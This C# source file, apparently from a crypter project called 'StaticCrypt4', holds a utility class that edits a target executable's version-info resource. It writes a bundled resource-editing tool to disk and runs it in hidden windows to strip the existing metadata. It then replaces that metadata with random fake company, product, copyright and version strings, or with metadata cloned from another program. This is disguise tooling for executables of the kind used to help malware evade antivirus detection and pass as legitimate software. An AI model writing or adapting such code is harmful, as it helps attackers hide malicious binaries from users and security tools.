using Properties;
using StaticCrypt4.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace StaticCrypt4.Utilies
{
	public static class VersionInfo
	{
		public static void Random(string file)
		{
			ReplaceR(file);
		}

		public static void Clone(string file, string cpfile)
		{
			ReplaceC(file, cpfile);
		}

		private static void ReplaceR(string file)
		{
			try
			{
				File.WriteAllBytes(FileUtils.StaticPath + "\\res.exe", Resources.res);
				string text = FileUtils.StaticPath + "\\" + Utiles.RandomString(5);
				string text2 = Resources.AssemblyRandom.Replace("[TITLE]", Utiles.RandomString(5)).Replace("[DESCRPTION]", Utiles.RandomString(5)).Replace("[COPANY]", Utiles.RandomString(5))
					.Replace("[PRODUCT]", Utiles.RandomString(5))
					.Replace("[COPYRIGHT]", Utiles.RandomString(5));
				string[] obj = new string[7];
				int num = Utiles.Rng.Next(1, 10);
				obj[0] = num.ToString();
				obj[1] = ".";
				num = Utiles.Rng.Next(1, 50);
				obj[2] = num.ToString();
				obj[3] = ".";
				num = Utiles.Rng.Next(1, 50);
				obj[4] = num.ToString();
				obj[5] = ".";
				num = Utiles.Rng.Next(1, 50);
				obj[6] = num.ToString();
				if (Utiles.BuildCode(text2.Replace("[VERSION]", string.Concat(obj)), text, 4, false, "", (string[])null))
				{
					ReplaceC(file, text);
				}
				else
				{
					MessageBox.Show("Error !", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
		}

		private static void ReplaceC(string file, string cpfile)
		{
			string text = FileUtils.StaticPath + "\\res.exe";
			File.WriteAllBytes(text, Resources.res);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			processStartInfo.Arguments = "-extract \"" + cpfile + "\", \"" + FileUtils.StaticPath + "\\info.res\", VersionInfo,,";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo).WaitForExit();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = text;
			processStartInfo2.Arguments = "-delete \"" + file + "\",\"" + file + "\", VersionInfo,,";
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo2).WaitForExit();
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.FileName = text;
			processStartInfo3.Arguments = "-addoverwrite \"" + file + "\", \"" + file + "\", \"" + FileUtils.StaticPath + "\\info.res\" , VersionInfo,1,";
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo3).WaitForExit();
			MessageBox.Show("Version Info was changed succefully !", "Succes", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}
}
